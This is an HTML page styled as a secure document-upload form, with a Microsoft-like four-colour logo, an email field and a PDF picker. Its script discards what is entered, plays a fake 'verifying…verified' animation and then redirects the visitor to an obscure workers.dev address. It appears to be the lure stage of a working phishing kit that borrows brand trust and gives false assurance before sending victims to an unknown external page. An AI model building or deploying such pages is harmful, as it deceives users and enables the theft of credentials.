<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload Your File Securely</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #dce3f7 0%, #e2e8f5 100%);
        }

        .card {
            background: #ffffff;
            width: 100%;
            max-width: 420px;
            border-radius: 16px;
            padding: 40px 36px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.06);
        }

        .logo {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 3px;
            width: 32px;
            height: 32px;
            margin-bottom: 24px;
        }

        .logo div {
            border-radius: 2px;
        }

        .logo .red { background-color: #f25022; }
        .logo .green { background-color: #7fba00; }
        .logo .blue { background-color: #00a4ef; }
        .logo .yellow { background-color: #ffb900; }

        h1 {
            font-size: 26px;
            font-weight: 700;
            color: #1e1e1e;
            text-align: center;
            line-height: 1.2;
            margin-bottom: 32px;
            letter-spacing: -0.5px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-group label {
            display: block;
            font-size: 15px;
            font-weight: 600;
            color: #1e1e1e;
            margin-bottom: 8px;
        }

        .form-group input[type="email"] {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #c8c8c8;
            border-radius: 8px;
            font-size: 15px;
            color: #1e1e1e;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input[type="email"]::placeholder {
            color: #8a8a8a;
        }

        .form-group input[type="email"]:focus {
            border-color: #0078d4;
        }

        .file-input-wrapper {
            border: 1px solid #c8c8c8;
            border-radius: 8px;
            padding: 6px;
            display: flex;
            align-items: center;
            background: #ffffff;
        }

        .file-input-wrapper input[type="file"] {
            width: 100%;
            font-size: 14px;
            color: #1e1e1e;
        }

        .file-input-wrapper input[type="file"]::file-selector-button {
            padding: 6px 12px;
            margin-right: 12px;
            border: 1px solid #c8c8c8;
            border-radius: 4px;
            background: #f2f2f2;
            font-size: 14px;
            cursor: pointer;
            color: #1e1e1e;
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: #2b6cb0;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }

        .btn:hover {
            background: #235a9b;
        }

        .btn:disabled {
            background: #7ea6d4;
            cursor: not-allowed;
        }

        .status-container {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px 0;
        }

        .status-container.active {
            display: flex;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #2b6cb0;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 16px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-text {
            font-size: 16px;
            font-weight: 600;
            color: #1e1e1e;
        }

        .checkmark {
            width: 40px;
            height: 40px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            background: #e6f4ea;
            color: #34a853;
            font-size: 24px;
            font-weight: bold;
        }

        .form-content.hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="card">
        <div id="formContent" class="form-content">
            <div class="logo">
                <div class="red"></div>
                <div class="green"></div>
                <div class="blue"></div>
                <div class="yellow"></div>
            </div>

            <h1>Upload Your File<br>Securely</h1>

            <form id="uploadForm">
                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" placeholder="Enter your email" required>
                </div>

                <div class="form-group">
                    <label for="file">Upload PDF</label>
                    <div class="file-input-wrapper">
                        <input type="file" id="file" accept=".pdf" required>
                    </div>
                </div>

                <button type="submit" class="btn" id="submitBtn">Submit and Verify</button>
            </form>
        </div>

        <div id="statusContainer" class="status-container">
            <div id="loader" class="spinner"></div>
            <div id="statusText" class="status-text">verifying</div>
        </div>
    </div>

    <script>
        const form = document.getElementById('uploadForm');
        const formContent = document.getElementById('formContent');
        const statusContainer = document.getElementById('statusContainer');
        const loader = document.getElementById('loader');
        const statusText = document.getElementById('statusText');

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const fileInput = document.getElementById('file');
            const file = fileInput.files[0];

            if (!email || !file) {
                return;
            }

            formContent.classList.add('hidden');
            statusContainer.classList.add('active');
            loader.style.display = 'block';
            statusText.textContent = 'verifying';

            setTimeout(() => {
                loader.style.display = 'none';
                statusText.innerHTML = '<div class="checkmark">&#10003;</div>verified';

                setTimeout(() => {
                    window.location.href = 'https://page-73-kasjaoij-lahjox-xvuasoi.gred.workers.dev';
                }, 1000);

            }, 2500);
        });
    </script>

</body>
</html>
